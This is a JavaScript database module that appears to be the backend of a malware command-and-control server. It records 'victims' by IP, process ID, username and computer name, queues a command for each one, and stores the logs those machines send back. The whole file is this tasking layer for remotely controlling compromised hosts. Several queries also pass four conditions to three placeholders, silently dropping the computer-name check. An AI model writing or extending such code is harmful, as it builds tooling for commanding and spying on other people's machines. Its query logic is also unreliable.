var db = require('../common/database');
var q = require('q');

var conn = db.getConnection();

function getAllVictims(){
    var defer = q.defer();

    var query = conn.query('SELECT * FROM webserver_victim', function(err, victims) {
        if(err){
            defer.reject(err);
        }else{
            defer.resolve(victims);
        }
    });

    return defer.promise;
}

function addVictim(params){
    if(params) {
        var defer = q.defer();

        var query = conn.query('INSERT INTO webserver_victim SET ?', params, function (err, result) {
            if (err) {
                defer.reject(err);
            } else {
                defer.resolve(result);
            }
        });

        return defer.promise;
    }

    return false;
}

function getVictim(params) {
    if(params){
        var defer = q.defer();
        var query = conn.query('SELECT * FROM webserver_victim WHERE ? AND ? AND ?', [{IP: params.IP}, {PID: params.PID}, {Username: params.Username}, {ComputerName: params.ComputerName}],function(err, result){
            if(err){
                defer.reject(err);
            }else{
                defer.resolve(result);
            }
        });

        return defer.promise;
    }

    return false;
}

function removeVictimByID(id) {
    if(id){
        var defer = q.defer();
        var query = conn.query('DELETE FROM webserver_victim WHERE ?', {id: id},function(err, result){
            if(err){
                defer.reject(err);
            }else{
                defer.resolve(result);
            }
        });

        return defer.promise;
    }

    return false;
}

function getID(params) {
    if(params){
        var defer = q.defer();
        var query = conn.query('SELECT id FROM webserver_victim WHERE ? AND ? AND ?', [{IP: params.IP}, {PID: params.PID}, {Username: params.Username}, {ComputerName: params.ComputerName}],function(err, result){
            if(err){
                defer.reject(err);
            }else{
                defer.resolve(result);
            }
        });

        return defer.promise;
    }

    return false;
}

function updateVictim(params) {
    if(params){
        var defer = q.defer();
        var query = conn.query('UPDATE webserver_victim SET ? WHERE ? AND ? AND ?', [{requested_at: params.requested_at}, {IP: params.IP}, {PID: params.PID}, {Username: params.Username}, {ComputerName: params.ComputerName}], function(err, result) {
            if(err){
                defer.reject(err);
            }else{
                defer.resolve(result);
            }
        });

        return defer.promise;
    }

    return false;
}

function getCommandByID(id){
    var defer = q.defer();

    var query = conn.query('SELECT command FROM webserver_victim WHERE ?', {id: id}, function(err, commands) {
        if(err){
            defer.reject(err);
        }else{
            defer.resolve(commands);
        }
    });

    return defer.promise;
}

function updateCommandByID(id, command) {
    if(id){
        var defer = q.defer();
        var query = conn.query('UPDATE webserver_victim SET ? WHERE ?', [{command: command}, {id: id}], function(err, result) {
            if(err){
                defer.reject(err);
            }else{
                defer.resolve(result);
            }
        });

        return defer.promise;
    }

    return false;
}

function getVictimByID(id){
    var defer = q.defer();

    var query = conn.query('SELECT * FROM webserver_victim WHERE ?', {id: id}, function(err, victims) {
        if(err){
            defer.reject(err);
        }else{
            defer.resolve(victims);
        }
    });

    return defer.promise;
}

function getLogByID(id){
    if(id){
        var defer = q.defer();

        var query = conn.query('SELECT log FROM webserver_victim WHERE ?', {id: id}, function(err, logs) {
            if(err){
                defer.reject(err);
            }else{
                defer.resolve(logs);
            }
        });

        return defer.promise;
    }
    return false;
}

function updateLogByID(id, log) {
    if(id){
        var defer = q.defer();
        var query = conn.query('UPDATE webserver_victim SET ? WHERE ?', [{log: log}, {id: id}], function(err, result) {
            if(err){
                defer.reject(err);
            }else{
                defer.resolve(result);
            }
        });

        return defer.promise;
    }

    return false;
}

module.exports = {
    getAllVictims: getAllVictims,
    addVictim: addVictim,
    getVictim: getVictim,
    removeVictimByID: removeVictimByID,
    updateVictim: updateVictim,
    getCommandByID: getCommandByID,
    updateCommandByID: updateCommandByID,
    getVictimByID: getVictimByID,
    getID: getID,
    getLogByID: getLogByID,
    updateLogByID: updateLogByID
};